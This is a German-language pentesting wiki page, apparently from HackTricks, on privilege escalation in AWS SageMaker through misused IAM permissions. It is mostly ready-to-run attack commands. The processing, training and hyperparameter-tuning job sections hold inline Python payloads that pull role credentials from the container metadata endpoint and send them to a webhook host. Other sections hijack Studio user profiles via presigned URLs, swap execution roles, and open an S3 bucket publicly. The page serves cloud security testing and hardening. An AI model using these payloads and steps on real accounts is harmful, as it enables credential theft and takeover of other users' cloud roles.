# AWS - Sagemaker Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## AWS - Sagemaker Privesc

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

Beginne mit der Erstellung eines Notebooks und weise die gewünschte IAM Role zu:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
Die Antwort sollte ein Feld `NotebookInstanceArn` enthalten, das die ARN der neu erstellten Notebook-Instanz angibt. Anschließend können wir die API `create-presigned-notebook-instance-url` verwenden, um eine URL zu erzeugen, mit der wir auf die Notebook-Instanz zugreifen können, sobald sie bereit ist:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
Öffne die URL im Browser und klicke oben rechts auf `Open JupyterLab`` , dann scrolle zum Tab “Launcher” und klicke im Abschnitt “Other” auf die Schaltfläche “Terminal”.

Nun ist es möglich, auf die Metadaten-Anmeldeinformationen der IAM Role zuzugreifen.

**Potential Impact:** Privesc auf die angegebene sagemaker service role.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Wenn darauf Jupyter **Notebooks bereits laufen** und du sie mit `sagemaker:ListNotebookInstances` auflisten kannst (oder sie auf andere Weise entdeckst), kannst du **eine URL für sie generieren, darauf zugreifen und die Anmeldedaten stehlen, wie in der vorherigen Technik beschrieben**.
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**Mögliche Auswirkung:** Privesc zur angehängten sagemaker Service-Rolle.


## `sagemaker:CreatePresignedDomainUrl`

> [!WARNING]
> Dieser Angriff funktioniert nur bei alten, traditionellen SageMaker Studio Domains, nicht bei denen, die von SageMaker Unified Studio erstellt wurden. Domains von Unified Studio geben den Fehler zurück: "This SageMaker AI Domain was created by SageMaker Unified Studio and must be accessed via SageMaker Unified Studio Portal".

Eine Identität mit der Berechtigung, `sagemaker:CreatePresignedDomainUrl` für ein Ziel-Studio-`UserProfile` aufzurufen, kann eine Login-URL erstellen, die direkt in SageMaker Studio als dieses Profil authentifiziert. Dies verschafft dem Browser des Angreifers eine Studio-Session, die die `ExecutionRole`-Berechtigungen des Profils erbt und vollen Zugriff auf das EFS-gesicherte Home-Verzeichnis und die Apps des Profils gewährt. Es wird keine `iam:PassRole`-Berechtigung oder Konsolenzugriff benötigt.

**Voraussetzungen**:
- Eine SageMaker Studio `Domain` und ein Ziel-`UserProfile` darin.
- Der Angreifer-Principal benötigt `sagemaker:CreatePresignedDomainUrl` auf dem Ziel-`UserProfile` (auf Ressourcenebene) oder `*`.

Minimales Policy-Beispiel (auf ein UserProfile beschränkt):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
**Abuse Steps**:

1) Enumerate a Studio Domain und UserProfiles, die du anvisieren kannst
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Prüfen, ob unified studio nicht verwendet wird (Angriff funktioniert nur bei traditionellen SageMaker Studio-Domains)
```bash
aws sagemaker describe-domain --domain-id <DOMAIN_ID> --query 'DomainSettings'
# If you get info about unified studio, this attack won't work
```
3) Erzeuge eine presigned URL (standardmäßig ~5 Minuten gültig)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
4) Öffne die zurückgegebene URL in einem Browser, um dich als Zielbenutzer in Studio anzumelden. In einem Jupyter-Terminal innerhalb von Studio verifiziere die effektive Identität oder exfiltrate das Token:
```bash
aws sts get-caller-identity
```
Hinweise:
- `--landing-uri` kann weggelassen werden. Einige Werte (z. B. `app:JupyterLab:/lab`) können je nach Studio-Flavor/Version abgelehnt werden; Standardwerte leiten typischerweise zur Studio-Startseite und dann zu Jupyter weiter.
- Org policies/VPC endpoint restrictions können den Netzwerkzugang weiterhin blockieren; das Erstellen des Tokens erfordert keine console sign‑in oder `iam:PassRole`.

**Mögliche Auswirkungen**: Seitliche Bewegung und Privilegieneskalation durch Übernahme jedes Studio `UserProfile`, dessen ARN erlaubt ist, wodurch dessen `ExecutionRole` und Dateisystem/Apps übernommen werden.


### `sagemaker:CreatePresignedMlflowTrackingServerUrl`, `sagemaker-mlflow:AccessUI`, `sagemaker-mlflow:SearchExperiments`

Eine Identität mit der Berechtigung, `sagemaker:CreatePresignedMlflowTrackingServerUrl` (und für späteren Zugriff `sagemaker-mlflow:AccessUI`, `sagemaker-mlflow:SearchExperiments`) für einen Ziel-SageMaker MLflow Tracking Server aufzurufen, kann eine einmalig verwendbare presigned URL erzeugen, die direkt beim verwalteten MLflow-UI dieses Servers authentifiziert. Das gewährt denselben Zugriff, den ein legitimer Benutzer auf den Server hätte (Experimente und Runs ansehen/erstellen sowie Artefakte im S3-Artifact-Store des Servers herunterladen/hochladen).

**Anforderungen:**
- Einen SageMaker MLflow Tracking Server im Account/Region sowie dessen Namen.
- Der Angreifer-Principal benötigt `sagemaker:CreatePresignedMlflowTrackingServerUrl` auf der Ziel-MLflow-Tracking-Server-Ressource (oder `*`).

**Missbrauchsschritte**:

1) Enumeriere MLflow Tracking Server, die du anvisieren kannst, und wähle einen Namen aus
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Erzeuge eine vorab signierte MLflow-UI-URL (gültig für kurze Zeit)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--query AuthorizedUrl --output text
```
3) Öffne die zurückgegebene URL in einem Browser, um auf die MLflow UI als authentifizierter Benutzer für diesen Tracking Server zuzugreifen.

**Mögliche Auswirkungen:** Direkter Zugriff auf die verwaltete MLflow UI für den anvisierten Tracking Server, wodurch das Anzeigen und Ändern von experiments/runs sowie das Herunterladen oder Hochladen von Artefakten ermöglicht wird, die im vom Server konfigurierten S3 artifact store gespeichert sind, innerhalb der vom Server konfigurierte Berechtigungen.

### `sagemaker:CreateProcessingJob`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen kann **SageMaker dazu bringen, einen processing job auszuführen** mit einer angehängten SageMaker-Rolle. Durch Wiederverwendung eines der AWS Deep Learning Containers, die bereits Python enthalten (und wenn du den Job in derselben Region wie die URI ausführst), kannst du Inline-Code ausführen, ohne eigene Images zu erstellen:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-arn-role>
IMAGE=683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3
ENV='{"W":"https://example.com/webhook"}'

aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":50}}' \
--app-specification "{\"ImageUri\":\"$IMAGE\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--environment "$ENV" \
--role-arn $ROLE_ARN

# Las credenciales llegan al webhook indicado. Asegúrate de que el rol tenga permisos ECR (AmazonEC2ContainerRegistryReadOnly) para descargar la imagen.
```
**Potential Impact:** Privesc auf die angegebene sagemaker-Service-Rolle.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen kann einen Training-Job starten, der beliebigen Code mit der angegebenen Rolle ausführt. Wenn man ein offizielles SageMaker-Container-Image verwendet und den entrypoint mit einem Inline-payload überschreibt, muss man keine eigenen Images bauen:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
ENV='{"W":"https://example.com/webhook"}'
OUTPUT_S3=s3://<existing-bucket>/training-output/
# El rol debe poder leer imágenes de ECR (p.e. AmazonEC2ContainerRegistryReadOnly) y escribir en OUTPUT_S3.

aws sagemaker create-training-job \
--training-job-name privesc-train \
--role-arn $ROLE_ARN \
--algorithm-specification "{\"TrainingImage\":\"$IMAGE\",\"TrainingInputMode\":\"File\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--output-data-config "{\"S3OutputPath\":\"$OUTPUT_S3\"}" \
--resource-config '{"InstanceCount":1,"InstanceType":"ml.m5.large","VolumeSizeInGB":50}' \
--stopping-condition '{"MaxRuntimeInSeconds":600}' \
--environment "$ENV"

# El payload se ejecuta en cuanto el job pasa a InProgress y exfiltra las credenciales del rol.
```
**Mögliche Auswirkung:** Privesc auf die angegebene SageMaker-Service-Rolle.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen kann einen HyperParameter Tuning Job starten, der vom Angreifer gesteuerten Code unter der bereitgestellten Rolle ausführt. Script mode erfordert das Hosten der Payload in S3, aber alle Schritte können über die CLI automatisiert werden:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
BUCKET=sm-hpo-privesc-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION

# Allow public reads so any SageMaker role can pull the code
aws s3api put-public-access-block \
--bucket $BUCKET \
--public-access-block-configuration '{
"BlockPublicAcls": false,
"IgnorePublicAcls": false,
"BlockPublicPolicy": false,
"RestrictPublicBuckets": false
}'

aws s3api put-bucket-policy --bucket $BUCKET --policy "{
\"Version\": \"2012-10-17\",
\"Statement\": [
{
\"Effect\": \"Allow\",
\"Principal\": \"*\",
\"Action\": \"s3:GetObject\",
\"Resource\": \"arn:aws:s3:::$BUCKET/*\"
}
]
}"

cat <<'EOF' > /tmp/train.py
import os, time, urllib.request

def main():
meta = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
if not meta:
return
creds = urllib.request.urlopen(f"http://169.254.170.2{meta}").read()
req = urllib.request.Request(
"https://example.com/webhook",
data=creds,
headers={"Content-Type": "application/json"}
)
urllib.request.urlopen(req)
print("train:loss=0")
time.sleep(300)

if __name__ == "__main__":
main()
EOF

cd /tmp
tar -czf code.tar.gz train.py
aws s3 cp code.tar.gz s3://$BUCKET/code/train-code.tar.gz --region $REGION --acl public-read

echo "dummy" > /tmp/input.txt
aws s3 cp /tmp/input.txt s3://$BUCKET/input/dummy.txt --region $REGION --acl public-read

IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
CODE_S3=s3://$BUCKET/code/train-code.tar.gz
TRAIN_INPUT_S3=s3://$BUCKET/input
OUTPUT_S3=s3://$BUCKET/output
# El rol necesita permisos ECR y escritura en el bucket.

cat > /tmp/hpo-definition.json <<EOF
{
"AlgorithmSpecification": {
"TrainingImage": "$IMAGE",
"TrainingInputMode": "File",
"MetricDefinitions": [{"Name": "train:loss", "Regex": "train:loss=([0-9.]+)"}]
},
"StaticHyperParameters": {
"sagemaker_program": "train.py",
"sagemaker_submit_directory": "$CODE_S3"
},
"RoleArn": "$ROLE_ARN",
"InputDataConfig": [
{
"ChannelName": "training",
"DataSource": {
"S3DataSource": {
"S3DataType": "S3Prefix",
"S3Uri": "$TRAIN_INPUT_S3",
"S3DataDistributionType": "FullyReplicated"
}
}
}
],
"OutputDataConfig": {
"S3OutputPath": "$OUTPUT_S3"
},
"ResourceConfig": {
"InstanceType": "ml.m5.large",
"InstanceCount": 1,
"VolumeSizeInGB": 50
},
"StoppingCondition": {
"MaxRuntimeInSeconds": 600
}
}
EOF

aws sagemaker create-hyper-parameter-tuning-job \
--hyper-parameter-tuning-job-name privesc-hpo \
--hyper-parameter-tuning-job-config '{"Strategy":"Random","ResourceLimits":{"MaxNumberOfTrainingJobs":1,"MaxParallelTrainingJobs":1},"HyperParameterTuningJobObjective":{"Type":"Maximize","MetricName":"train:loss"}}' \
--training-job-definition file:///tmp/hpo-definition.json
```
Jedes vom Prozess gestartete Training gibt die Metrik aus und exfiltriert die Anmeldeinformationen der angegebenen Rolle.


### `sagemaker:UpdateUserProfile`, `iam:PassRole`, `sagemaker:CreateApp`, `sagemaker:CreatePresignedDomainUrl`, (`sagemaker:DeleteApp`)

Mit der Berechtigung, ein SageMaker Studio-Benutzerprofil zu aktualisieren, eine App zu erstellen, eine presigned URL zur App zu erzeugen und `iam:PassRole`, kann ein Angreifer die `ExecutionRole` auf jede IAM-Rolle setzen, die der SageMaker-Service-Principal übernehmen kann. Neue für dieses Profil gestartete Studio-Apps laufen mit der ausgetauschten Rolle und gewähren interaktiv erhöhte Berechtigungen über Jupyter-Terminals oder Jobs, die von Studio gestartet werden.

> [!WARNING]
> Dieser Angriff setzt voraus, dass sich keine Anwendungen im Profil befinden, andernfalls schlägt die Erstellung der App mit einer ähnlichen Fehlermeldung fehl: `An error occurred (ValidationException) when calling the UpdateUserProfile operation: Unable to update UserProfile [arn:aws:sagemaker:us-east-1:947247140022:user-profile/d-fcmlssoalfra/test-user-profile-2] with InService App. Delete all InService apps for UserProfile and try again.`
> Falls eine App vorhanden ist, benötigen Sie zuerst die Berechtigung `sagemaker:DeleteApp`, um diese zu löschen.

Schritte:
```bash
# 1) List Studio domains and pick a target
aws sagemaker list-domains --query 'Domains[].{Id:DomainId,Name:DomainName}'

# 2) List Studio user profiles and pick a target
aws sagemaker list-user-profiles --domain-id-equals <DOMAIN_ID>

# Choose a more-privileged role that already trusts sagemaker.amazonaws.com
ROLE_ARN=arn:aws:iam::<ACCOUNT_ID>:role/<HighPrivSageMakerExecutionRole>

# 3) Update the Studio profile to use the new role (no iam:PassRole)
aws sagemaker update-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query 'UserSettings.ExecutionRole' --output text

# 3.1) Optional if you need to delete existing apps first
# List existing apps
aws sagemaker list-apps \
--domain-id-equals <DOMAIN_ID>

# Delete an app
aws sagemaker delete-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name <APP_NAME>

# 4) Create a JupyterServer app for a user profile (will inherit domain default role)
aws sagemaker create-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name <APP_NAME>


# 5) Generate a presigned URL to access Studio with the new domain default role
aws sagemaker create-presigned-domain-url \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query AuthorizedUrl --output text

# 6) Open the URL in browser, navigate to JupyterLab, open Terminal and verify:
#    aws sts get-caller-identity
#    (should show the high-privilege role from domain defaults)

```
**Potentielle Auswirkung**: Privilegieneskalation auf die Berechtigungen der angegebenen SageMaker ExecutionRole für interaktive Studio-Sitzungen.


### `sagemaker:UpdateDomain`, `sagemaker:CreateApp`, `iam:PassRole`, `sagemaker:CreatePresignedDomainUrl`, (`sagemaker:DeleteApp`)

Mit Berechtigungen zum Aktualisieren einer SageMaker Studio Domain, zum Erstellen einer App und einer presigned URL für die App sowie `iam:PassRole` kann ein Angreifer die standardmäßige Domain-`ExecutionRole` auf jede IAM-Rolle setzen, die der SageMaker service principal übernehmen kann. Neue Studio-Apps, die für dieses Profil gestartet werden, laufen mit der ausgetauschten Rolle und gewähren interaktiv erhöhte Berechtigungen über Jupyter-Terminals oder Jobs, die aus Studio gestartet werden.

> [!WARNING]
> Für diesen Angriff dürfen sich keine Anwendungen in der Domain befinden; andernfalls schlägt das Erstellen der App mit dem Fehler fehl: `An error occurred (ValidationException) when calling the UpdateDomain operation: Unable to update Domain [arn:aws:sagemaker:us-east-1:947247140022:domain/d-fcmlssoalfra] with InService App. Delete all InService apps in the domain including shared Apps for [domain-shared] User Profile, and try again.`

Schritte:
```bash
# 1) List Studio domains and pick a target
aws sagemaker list-domains --query 'Domains[].{Id:DomainId,Name:DomainName}'

# 2) List Studio user profiles and pick a target
aws sagemaker list-user-profiles --domain-id-equals <DOMAIN_ID>

# Choose a more-privileged role that already trusts sagemaker.amazonaws.com
ROLE_ARN=arn:aws:iam::<ACCOUNT_ID>:role/<HighPrivSageMakerExecutionRole>

# 3) Change the domain default so every profile inherits the new role
aws sagemaker update-domain \
--domain-id <DOMAIN_ID> \
--default-user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-domain \
--domain-id <DOMAIN_ID> \
--query 'DefaultUserSettings.ExecutionRole' --output text

# 3.1) Optional if you need to delete existing apps first
# List existing apps
aws sagemaker list-apps \
--domain-id-equals <DOMAIN_ID>

# Delete an app
aws sagemaker delete-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name <APP_NAME>

# 4) Create a JupyterServer app for a user profile (will inherit domain default role)
aws sagemaker create-app \
--domain-id <DOMAIN_ID> \
--app-type JupyterServer \
--app-name js-domain-escalated

# 5) Generate a presigned URL to access Studio with the new domain default role
aws sagemaker create-presigned-domain-url \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query AuthorizedUrl --output text

# 6) Open the URL in browser, navigate to JupyterLab, open Terminal and verify:
#    aws sts get-caller-identity
#    (should show the high-privilege role from domain defaults)
```
**Potential Impact**: Privilegieneskalation zu den Berechtigungen der angegebenen SageMaker ExecutionRole für interaktive Studio-Sitzungen.

### `sagemaker:CreateApp`, `sagemaker:CreatePresignedDomainUrl`

Ein Angreifer mit der Berechtigung, eine SageMaker Studio App für ein Ziel-UserProfile zu erstellen, kann eine JupyterServer-App starten, die mit der `ExecutionRole` des Profiles ausgeführt wird. Dies ermöglicht interaktiven Zugriff auf die Berechtigungen der Rolle über Jupyter-Terminals oder Jobs, die aus Studio gestartet werden.

Schritte:
```bash
# 1) List Studio domains and pick a target
aws sagemaker list-domains --query 'Domains[].{Id:DomainId,Name:DomainName}'

# 2) List Studio user profiles and pick a target
aws sagemaker list-user-profiles --domain-id-equals <DOMAIN_ID>

# 3) Create a JupyterServer app for the user profile
aws sagemaker create-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name js-privesc

# 4) Generate a presigned URL to access Studio
aws sagemaker create-presigned-domain-url \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query AuthorizedUrl --output text

# 5) Open the URL in browser, navigate to JupyterLab, open Terminal and verify:
#    aws sts get-caller-identity
```
**Potenzielle Auswirkung**: Interaktiver Zugriff auf die SageMaker-Ausführungsrolle, die dem Ziel-UserProfile zugeordnet ist.


### `iam:GetUser`, `datazone:CreateUserProfile`

Ein Angreifer mit diesen Berechtigungen kann einem IAM user Zugriff auf eine Sagemaker Unified Studio Domain gewähren, indem er ein DataZone User Profile für diesen erstellt.
```bash
# List domains
aws datazone list-domains --region us-east-1 \
--query "items[].{Id:id,Name:name}" \
--output json

# Add IAM user as a user of the domain
aws datazone create-user-profile \
--region us-east-1 \
--domain-identifier <domain-id> \
--user-identifier <arn-user> \
--user-type IAM_USER
```
Die Unified Domain-URL hat folgendes Format: `https://<domain-id>.sagemaker.<region>.on.aws/` (z. B. `https://dzd-cmixuznq0h8cmf.sagemaker.us-east-1.on.aws/`).

**Mögliche Auswirkungen:** Zugriff auf die Sagemaker Unified Studio Domain als Benutzer, wodurch man auf alle Ressourcen innerhalb der Sagemaker Unified Studio Domain zugreifen und sogar Privilegien auf die Rolle eskalieren kann, die von den Notebooks innerhalb der Sagemaker Unified Studio Domain verwendet wird.

## Referenzen

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)


{{#include ../../../../banners/hacktricks-training.md}}
